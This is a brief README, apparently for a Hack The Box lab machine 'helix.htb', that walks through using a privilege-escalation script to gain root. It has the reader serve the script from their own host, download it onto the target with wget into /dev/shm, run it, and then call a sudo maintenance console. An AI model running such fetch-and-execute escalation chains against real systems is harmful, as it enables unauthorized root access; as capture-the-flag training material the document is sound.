# Helix Privilege Escalation
## Script for privilege escalation on helix.htb

### Inside your terminal

'''sh
git clone https://github.com/john-snow12/Helix_PrivilegeEscal_toRoot.git
cd Helix_PrivilegeEscal_toRoot
python3 -m http.server 80
'''

### Inside Helix terminal (SSH using 'operator' user)

'''sh
wget http://(YOUR_HTB_IP)/privilege_escalationHelix.py /dev/shm
python3 /dev/shm/privilege_escalationHelix.py
'''
(wait the process)
'''sh
sudo helix-maint-console
'''
